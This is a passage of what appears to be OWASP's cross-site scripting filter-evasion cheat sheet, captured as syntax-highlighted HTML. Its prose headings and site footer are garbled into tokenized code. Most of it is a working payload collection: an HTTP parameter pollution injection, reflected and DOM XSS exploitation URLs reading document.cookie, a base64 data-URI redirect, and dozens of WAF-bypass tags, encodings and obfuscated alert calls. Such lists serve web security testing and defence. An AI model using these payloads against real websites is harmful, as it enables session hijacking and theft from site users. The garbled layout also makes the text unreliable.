</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">/share?content_type=1&amp;title=This is a regular title&amp;amp;content_type=1;alert(1)</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Share</span><span class="o">&lt;</span><span class="sr">/a</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Share Page Output And in share page output could be this:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="kd">var</span> <span class="nx">contentType</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

<span class="kd">var</span> <span class="nx">title</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">This is a regular title</span><span class="dl">"</span><span class="p">;</span>
<span class="err">…</span>
<span class="c1">//some user agreement and sending to server logic might be here</span>
<span class="err">…</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><p>As a result, in this example the main flaw is trusting the content_type in the “Share” page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.</p><p>Character Escape Sequences All the possible combinations of the character “&lt;” in HTML and JavaScript. Most of these won’t render out of the box, but many of them can get rendered in certain circumstances as seen above.</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
</pre><td class="rouge-code"><pre><span class="o">&lt;</span>
<span class="o">%</span><span class="mi">3</span><span class="nx">C</span>

<span class="o">&amp;</span><span class="nx">lt</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">LT</span>
<span class="o">&amp;</span><span class="nx">LT</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="mi">60</span>
<span class="o">&amp;</span><span class="err">#</span><span class="mi">060</span>
<span class="o">&amp;</span><span class="err">#</span><span class="mi">0060</span>
<span class="o">&amp;</span><span class="err">#</span><span class="mi">00060</span>
<span class="o">&amp;</span><span class="err">#</span><span class="mi">000060</span>
<span class="o">&amp;</span><span class="err">#</span><span class="mi">0000060</span>
<span class="o">&amp;</span><span class="err">#</span><span class="mi">60</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="mi">060</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="mi">0060</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="mi">00060</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="mi">000060</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="mi">0000060</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x3c</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x03c</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x003c</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x0003c</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x00003c</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x000003c</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x3c</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x03c</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x003c</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x0003c</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x00003c</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x000003c</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X3c</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X03c</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X003c</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X0003c</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X00003c</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X000003c</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X3c</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X03c</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X003c</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X0003c</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X00003c</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X000003c</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x3C</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x03C</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x003C</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x0003C</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x00003C</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x000003C</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x3C</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x03C</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x003C</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x0003C</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x00003C</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">x000003C</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X3C</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X03C</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X003C</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X0003C</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X00003C</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X000003C</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X3C</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X03C</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X003C</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X0003C</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X00003C</span><span class="p">;</span>
<span class="o">&amp;</span><span class="err">#</span><span class="nx">X000003C</span><span class="p">;</span>
<span class="err">\</span><span class="nx">x3c</span>
<span class="err">\</span><span class="nx">x3C</span>
<span class="err">\</span><span class="nx">u003c</span>
<span class="err">\</span><span class="nx">u003C</span>
<span class="nx">Methods</span> <span class="nx">to</span> <span class="nx">Bypass</span> <span class="nx">WAF</span> <span class="err">–</span> <span class="nx">Cross</span><span class="o">-</span><span class="nx">Site</span> <span class="nx">Scripting</span>
<span class="nx">General</span> <span class="nx">issues</span>
<span class="nx">Stored</span> <span class="nx">XSS</span>
<span class="nx">If</span> <span class="nx">an</span> <span class="nx">attacker</span> <span class="nx">managed</span> <span class="nx">to</span> <span class="nx">push</span> <span class="nx">XSS</span> <span class="nx">through</span> <span class="nx">the</span> <span class="nx">filter</span><span class="p">,</span> <span class="nx">WAF</span> <span class="nx">wouldn</span><span class="err">’</span><span class="nx">t</span> <span class="nx">be</span> <span class="nx">able</span> <span class="nx">to</span> <span class="nx">prevent</span> <span class="nx">the</span> <span class="nx">attack</span> <span class="nx">conduction</span><span class="p">.</span>

<span class="nx">Reflected</span> <span class="nx">XSS</span> <span class="k">in</span> <span class="nx">Javascript</span>
<span class="nx">Example</span><span class="p">:</span> <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> <span class="p">...</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="err">\\</span><span class="dl">"</span><span class="s2">writetitle()</span><span class="se">\\</span><span class="dl">"</span><span class="p">,</span><span class="nx">$</span><span class="err">\</span><span class="nx">_GET</span><span class="err">\</span><span class="p">[</span><span class="nx">xss</span><span class="err">\</span><span class="p">])</span> <span class="p">...</span> <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="nx">Exploitation</span><span class="p">:</span> <span class="o">/</span><span class="p">?</span><span class="nx">xss</span><span class="o">=</span><span class="mi">500</span><span class="p">);</span> <span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="c1">//</span>
<span class="nx">DOM</span><span class="o">-</span><span class="nx">based</span> <span class="nx">XSS</span>
<span class="nx">Example</span><span class="p">:</span> <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> <span class="p">...</span> <span class="nf">eval</span><span class="p">(</span><span class="nx">$</span><span class="err">\</span><span class="nx">_GET</span><span class="err">\</span><span class="p">[</span><span class="nx">xss</span><span class="err">\</span><span class="p">]);</span> <span class="p">...</span> <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="nx">Exploitation</span><span class="p">:</span> <span class="o">/</span><span class="p">?</span><span class="nx">xss</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
<span class="nx">XSS</span> <span class="nx">via</span> <span class="nx">request</span> <span class="nx">Redirection</span>
<span class="nx">Vulnerable</span> <span class="nx">code</span><span class="p">:</span>
<span class="p">...</span>
<span class="nf">header</span><span class="p">(</span><span class="dl">'</span><span class="s1">Location: </span><span class="dl">'</span><span class="p">.</span><span class="nx">$_GET</span><span class="p">[</span><span class="dl">'</span><span class="s1">param</span><span class="dl">'</span><span class="p">]);</span>
<span class="p">...</span>
<span class="nx">As</span> <span class="nx">well</span> <span class="k">as</span><span class="p">:</span>

<span class="p">..</span>
<span class="nf">header</span><span class="p">(</span><span class="dl">'</span><span class="s1">Refresh: 0; URL=</span><span class="dl">'</span><span class="p">.</span><span class="nx">$_GET</span><span class="p">[</span><span class="dl">'</span><span class="s1">param</span><span class="dl">'</span><span class="p">]);</span>
<span class="p">...</span>
<span class="nx">This</span> <span class="nx">request</span> <span class="nx">will</span> <span class="nx">not</span> <span class="nx">pass</span> <span class="nx">through</span> <span class="nx">the</span> <span class="nx">WAF</span><span class="p">:</span>
<span class="o">/</span><span class="p">?</span><span class="nx">param</span><span class="o">=&lt;</span><span class="nx">javascript</span><span class="p">:</span><span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">&gt;</span><span class="p">)</span>

<span class="nx">This</span> <span class="nx">request</span> <span class="nx">will</span> <span class="nx">pass</span> <span class="nx">through</span> <span class="nx">the</span> <span class="nx">WAF</span> <span class="nx">and</span> <span class="nx">an</span> <span class="nx">XSS</span> <span class="nx">attack</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">conducted</span> <span class="k">in</span> <span class="nx">certain</span> <span class="nx">browsers</span><span class="p">.</span>
<span class="o">/</span><span class="p">?</span><span class="nx">param</span><span class="o">=&lt;</span><span class="nx">data</span><span class="p">:</span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span><span class="nx">base64</span><span class="p">,</span><span class="nx">PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4</span><span class="o">=</span>

<span class="nx">WAF</span> <span class="nx">ByPass</span> <span class="nx">Strings</span> <span class="k">for</span> <span class="nx">XSS</span><span class="p">.</span>
<span class="o">&lt;</span><span class="nx">Img</span> <span class="nx">src</span> <span class="o">=</span> <span class="nx">x</span> <span class="nx">onerror</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">javascript: window.onerror = alert; throw XSS</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">Video</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="nx">source</span> <span class="nx">onerror</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">javascript: alert (XSS)</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">Input</span> <span class="nx">value</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">XSS</span><span class="dl">"</span> <span class="nx">type</span> <span class="o">=</span> <span class="nx">text</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">applet</span> <span class="nx">code</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:confirm(document.cookie);</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">isindex</span> <span class="nx">x</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:</span><span class="dl">"</span> <span class="nx">onmouseover</span><span class="o">=</span><span class="dl">"</span><span class="s2">alert(XSS)</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="dl">"</span><span class="s2">&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">x:x</span><span class="dl">"</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">alert(XSS)</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="dl">"</span><span class="s2">&gt;&lt;iframe src=</span><span class="dl">"</span><span class="nx">javascript</span><span class="p">:</span><span class="nf">alert</span><span class="p">(</span><span class="nx">XSS</span><span class="p">)</span><span class="dl">"</span><span class="s2">&gt;
&lt;object data=</span><span class="dl">"</span><span class="nx">javascript</span><span class="p">:</span><span class="nf">alert</span><span class="p">(</span><span class="nx">XSS</span><span class="p">)</span><span class="dl">"</span><span class="s2">&gt;
&lt;isindex type=image src=1 onerror=alert(XSS)&gt;
&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;
&lt;img src=</span><span class="dl">"</span><span class="nx">x</span><span class="p">:</span><span class="nx">gif</span><span class="dl">"</span><span class="s2"> onerror=</span><span class="dl">"</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">al</span><span class="se">\</span><span class="s1">u0065rt</span><span class="dl">'</span><span class="p">](</span><span class="mi">0</span><span class="p">)</span><span class="dl">"</span><span class="s2">&gt;&lt;/img&gt;
&lt;iframe/src=</span><span class="dl">"</span><span class="nx">data</span><span class="p">:</span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="o">&lt;</span><span class="nx">svg</span> <span class="nx">onload</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="dl">"</span><span class="s2">&gt;
&lt;meta content=</span><span class="dl">"</span><span class="o">&amp;</span><span class="nx">NewLine</span><span class="p">;</span> <span class="mi">1</span> <span class="o">&amp;</span><span class="nx">NewLine</span><span class="p">;;</span> <span class="nx">JAVASCRIPT</span><span class="o">&amp;</span><span class="nx">colon</span><span class="p">;</span> <span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="dl">"</span><span class="s2"> http-equiv=</span><span class="dl">"</span><span class="nx">refresh</span><span class="dl">"</span><span class="s2">/&gt;
&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://www.google.com/')&gt;&lt;/script
&lt;meta http-equiv=</span><span class="dl">"</span><span class="nx">refresh</span><span class="dl">"</span><span class="s2"> content=</span><span class="dl">"</span><span class="mi">0</span><span class="p">;</span><span class="nx">url</span><span class="o">=</span><span class="nx">javascript</span><span class="p">:</span><span class="nf">confirm</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="dl">"</span><span class="s2">&gt;
&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;
&lt;form&gt;&lt;a href=</span><span class="dl">"</span><span class="nx">javascript</span><span class="p">:</span><span class="err">\</span><span class="nf">u0061lert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="dl">"</span><span class="s2">&gt;X
&lt;/script&gt;&lt;img/*%00/src=</span><span class="dl">"</span><span class="nx">worksinchrome</span><span class="o">&amp;</span><span class="nx">colon</span><span class="p">;</span><span class="nf">prompt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="dl">"</span><span class="s2">/%00*/onerror='eval(src)'&gt;
&lt;style&gt;//*{x:expression(alert(/xss/))}//&lt;style&gt;&lt;/style&gt;
On Mouse Over​
&lt;img src=</span><span class="dl">"</span><span class="o">/</span><span class="dl">"</span><span class="s2"> =_=</span><span class="dl">"</span> <span class="nx">title</span><span class="o">=</span><span class="dl">"</span><span class="s2">onerror='prompt(1)'</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">a</span> <span class="nx">aa</span> <span class="nx">aaa</span> <span class="nx">aaaa</span> <span class="nx">aaaaa</span> <span class="nx">aaaaaa</span> <span class="nx">aaaaaaa</span> <span class="nx">aaaaaaaa</span> <span class="nx">aaaaaaaaa</span> <span class="nx">aaaaaaaaaa</span> <span class="nx">href</span><span class="o">=</span><span class="nx">j</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">97</span><span class="nx">v</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">97</span><span class="nx">script</span><span class="p">:</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">97</span><span class="nf">lert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="nx">ClickMe</span>
<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">x</span><span class="o">&gt;</span> <span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span><span class="sr">/script 1=</span><span class="err">2
</span><span class="o">&lt;</span><span class="nx">form</span><span class="o">&gt;&lt;</span><span class="nx">button</span> <span class="nx">formaction</span><span class="o">=</span><span class="nx">javascript</span><span class="o">&amp;</span><span class="nx">colon</span><span class="p">;</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="nx">CLICKME</span>
<span class="o">&lt;</span><span class="nx">input</span><span class="o">/</span><span class="nx">onmouseover</span><span class="o">=</span><span class="dl">"</span><span class="s2">javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;</span><span class="dl">"</span>
<span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/iframe</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">OBJECT</span> <span class="nx">CLASSID</span><span class="o">=</span><span class="dl">"</span><span class="s2">clsid:333C7BC4-460F-11D0-BC04-0080C7055A83</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="nx">PARAM</span> <span class="nx">NAME</span><span class="o">=</span><span class="dl">"</span><span class="s2">DataURL</span><span class="dl">"</span> <span class="nx">VALUE</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert(1)</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/OBJECT</span><span class="err">&gt;
</span><span class="nx">Filter</span> <span class="nx">Bypass</span> <span class="nx">Alert</span> <span class="nx">Obfuscation</span>
<span class="p">(</span><span class="nx">alert</span><span class="p">)(</span><span class="mi">1</span><span class="p">)</span>
<span class="nx">a</span><span class="o">=</span><span class="nx">alert</span><span class="p">,</span><span class="nf">a</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">find</span><span class="p">(</span><span class="nx">alert</span><span class="p">)</span>
<span class="nx">top</span><span class="p">[</span><span class="err">“</span><span class="nx">al</span><span class="err">”</span><span class="o">+</span><span class="err">”</span><span class="nx">ert</span><span class="err">”</span><span class="p">](</span><span class="mi">1</span><span class="p">)</span>
<span class="nx">top</span><span class="p">[</span><span class="sr">/al/</span><span class="p">.</span><span class="nx">source</span><span class="o">+</span><span class="sr">/ert/</span><span class="p">.</span><span class="nx">source</span><span class="p">](</span><span class="mi">1</span><span class="p">)</span>
<span class="nx">al</span><span class="err">\</span><span class="nf">u0065rt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nx">top</span><span class="p">[</span><span class="err">‘</span><span class="nx">al</span><span class="err">\</span><span class="mi">145</span><span class="nx">rt</span><span class="err">’</span><span class="p">](</span><span class="mi">1</span><span class="p">)</span>
<span class="nx">top</span><span class="p">[</span><span class="err">‘</span><span class="nx">al</span><span class="err">\</span><span class="nx">x65rt</span><span class="err">’</span><span class="p">](</span><span class="mi">1</span><span class="p">)</span>
<span class="nx">top</span><span class="p">[</span><span class="mi">8680439</span><span class="p">..</span><span class="nf">toString</span><span class="p">(</span><span class="mi">30</span><span class="p">)](</span><span class="mi">1</span><span class="p">)</span>
<span class="nx">Edit</span> <span class="nx">on</span> <span class="nx">GitHub</span>
<span class="nx">The</span> <span class="nx">OWASP</span><span class="err">®</span> <span class="nx">Foundation</span> <span class="nx">works</span> <span class="nx">to</span> <span class="nx">improve</span> <span class="nx">the</span> <span class="nx">security</span> <span class="k">of</span> <span class="nx">software</span> <span class="nx">through</span> <span class="nx">its</span> <span class="nx">community</span><span class="o">-</span><span class="nx">led</span> <span class="nx">open</span> <span class="nx">source</span> <span class="nx">software</span> <span class="nx">projects</span><span class="p">,</span> <span class="nx">hundreds</span> <span class="k">of</span> <span class="nx">chapters</span> <span class="nx">worldwide</span><span class="p">,</span> <span class="nx">tens</span> <span class="k">of</span> <span class="nx">thousands</span> <span class="k">of</span> <span class="nx">members</span><span class="p">,</span> <span class="nx">and</span> <span class="nx">by</span> <span class="nx">hosting</span> <span class="nx">local</span> <span class="nx">and</span> <span class="nb">global</span> <span class="nx">conferences</span><span class="p">.</span>
<span class="nx">Upcoming</span> <span class="nx">Global</span> <span class="nx">Events</span>
<span class="nx">Virtual</span> <span class="nx">AppSec</span> <span class="nx">Days</span><span class="p">,</span> <span class="nx">Summer</span>
<span class="nx">Global</span> <span class="nx">AppSec</span> <span class="nx">SF</span> <span class="nx">October</span> <span class="mi">19</span><span class="nx">th</span><span class="o">-</span><span class="mi">23</span><span class="nx">rd</span>
<span class="nx">Global</span> <span class="nx">AppSec</span> <span class="nx">Dublin</span> <span class="nx">February</span> <span class="mi">15</span><span class="o">-</span><span class="mi">19</span><span class="nx">th</span><span class="p">,</span> <span class="mi">2021</span>
<span class="nx">Spotlight</span><span class="p">:</span> <span class="nx">HiSolutions</span>
<span class="nx">image</span>
<span class="nx">We</span> <span class="nx">combine</span> <span class="nx">know</span><span class="o">-</span><span class="nx">how</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">areas</span> <span class="k">of</span> <span class="nx">security</span> <span class="nx">consulting</span><span class="p">,</span> <span class="nx">IT</span> <span class="nx">governance</span><span class="p">,</span> <span class="nx">risk</span> <span class="o">&amp;</span> <span class="nx">compliance</span> <span class="kd">with</span> <span class="nx">conceptual</span> <span class="nx">strength</span><span class="p">,</span> <span class="nx">innovation</span> <span class="nx">and</span> <span class="nx">implementation</span> <span class="nx">expertise</span><span class="p">.</span> <span class="nx">In</span> <span class="nx">addition</span> <span class="nx">to</span> <span class="nx">protecting</span> <span class="nx">applications</span> <span class="nx">and</span> <span class="nx">networks</span><span class="p">,</span> <span class="nx">our</span> <span class="nx">core</span> <span class="nx">competencies</span> <span class="nx">also</span> <span class="nx">include</span> <span class="nx">organizational</span> <span class="nx">tasks</span> <span class="nx">such</span> <span class="k">as</span> <span class="nx">setting</span> <span class="nx">up</span> <span class="nx">security</span><span class="p">,</span> <span class="nx">risk</span><span class="p">,</span> <span class="nx">and</span> <span class="nx">service</span> <span class="nx">management</span> <span class="nx">system</span><span class="p">.</span> <span class="nx">HiSolutions</span> <span class="nx">AG</span> <span class="nx">is</span> <span class="nx">one</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">leading</span> <span class="nx">consulting</span> <span class="nx">specialists</span> <span class="k">for</span> <span class="nx">IT</span> <span class="nx">management</span> <span class="nx">and</span> <span class="nx">information</span> <span class="nx">security</span> <span class="k">in</span> <span class="nx">Germany</span><span class="p">.</span> <span class="nx">More</span> <span class="nx">than</span> <span class="mi">200</span> <span class="nx">experts</span> <span class="nx">advise</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">areas</span> <span class="k">of</span> <span class="nx">security</span> <span class="nx">consulting</span><span class="p">,</span> <span class="nx">IT</span> <span class="nx">governance</span><span class="p">,</span> <span class="nx">business</span> <span class="nx">continuity</span> <span class="nx">management</span><span class="p">,</span> <span class="nx">and</span> <span class="nx">digitalization</span><span class="p">.</span> <span class="nx">We</span> <span class="nx">actively</span> <span class="nx">participate</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">development</span> <span class="k">of</span> <span class="nx">national</span> <span class="nx">and</span> <span class="nx">international</span> <span class="nx">standards</span> <span class="nx">and</span> <span class="nx">are</span> <span class="nx">involved</span> <span class="k">in</span> <span class="nx">various</span> <span class="nx">research</span> <span class="nx">projects</span> <span class="nx">and</span> <span class="nx">university</span> <span class="nx">teachings</span><span class="p">.</span>

<span class="nx">Corporate</span> <span class="nx">Supporters</span>
<span class="nx">image</span>
<span class="nx">image</span>
<span class="nx">image</span>
<span class="nx">image</span>
<span class="nx">image</span>
<span class="nx">image</span>
<span class="nx">image</span>
<span class="nx">image</span>
<span class="nx">image</span>
<span class="nx">Become</span> <span class="nx">a</span> <span class="nx">corporate</span> <span class="nx">supporter</span>

<span class="nx">PRIVACY</span> <span class="nx">SITEMAP</span> <span class="nx">CONTACT</span>
<span class="nx">OWASP</span><span class="p">,</span> <span class="nx">Open</span> <span class="nx">Web</span> <span class="nx">Application</span> <span class="nx">Security</span> <span class="nx">Project</span><span class="p">,</span> <span class="nx">and</span> <span class="nx">Global</span> <span class="nx">AppSec</span> <span class="nx">are</span> <span class="nx">registered</span> <span class="nx">trademarks</span> <span class="nx">and</span> <span class="nx">AppSec</span> <span class="nx">Days</span><span class="p">,</span> <span class="nx">AppSec</span> <span class="nx">California</span><span class="p">,</span> <span class="nx">AppSec</span> <span class="nx">Cali</span><span class="p">,</span> <span class="nx">SnowFROC</span><span class="p">,</span> <span class="nx">LASCON</span><span class="p">,</span> <span class="nx">and</span> <span class="nx">the</span> <span class="nx">OWASP</span> <span class="nx">logo</span> <span class="nx">are</span> <span class="nx">trademarks</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">OWASP</span> <span class="nx">Foundation</span><span class="p">,</span> <span class="nx">Inc</span><span class="p">.</span> <span class="nx">Unless</span> <span class="nx">otherwise</span> <span class="nx">specified</span><span class="p">,</span> <span class="nx">all</span> <span class="nx">content</span> <span class="nx">on</span> <span class="nx">the</span> <span class="nx">site</span> <span class="nx">is</span> <span class="nx">Creative</span> <span class="nx">Commons</span> <span class="nx">Attribution</span><span class="o">-</span><span class="nx">ShareAlike</span> <span class="nx">v4</span><span class="p">.</span><span class="mi">0</span> <span class="nx">and</span> <span class="nx">provided</span> <span class="nx">without</span> <span class="nx">warranty</span> <span class="k">of</span> <span class="nx">service</span> <span class="nx">or</span> <span class="nx">accuracy</span><span class="p">.</span> <span class="nx">For</span> <span class="nx">more</span> <span class="nx">information</span><span class="p">,</span> <span class="nx">please</span> <span class="nx">refer</span> <span class="nx">to</span> <span class="nx">our</span> <span class="nx">General</span> <span class="nx">Disclaimer</span><span class="p">.</span> <span class="nx">OWASP</span> <span class="nx">does</span> <span class="nx">not</span> <span class="nx">endorse</span> <span class="nx">or</span> <span class="nx">recommend</span> <span class="nx">commercial</span> <span class="nx">products</span> <span class="nx">or</span> <span class="nx">services</span><span class="p">,</span> <span class="nx">allowing</span> <span class="nx">our</span> <span class="nx">community</span> <span class="nx">to</span> <span class="nx">remain</span> <span class="nx">vendor</span> <span class="nx">neutral</span> <span class="kd">with</span> <span class="nx">the</span> <span class="nx">collective</span> <span class="nx">wisdom</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">best</span> <span class="nx">minds</span> <span class="k">in</span> <span class="nx">software</span> <span class="nx">security</span> <span class="nx">worldwide</span><span class="p">.</span> <span class="nx">Copyright</span> <span class="mi">2020</span><span class="p">,</span> <span class="nx">OWASP</span> <span class="nx">Foundation</span><span class="p">,</span> <span class="nx">Inc</span><span class="p">.</span>
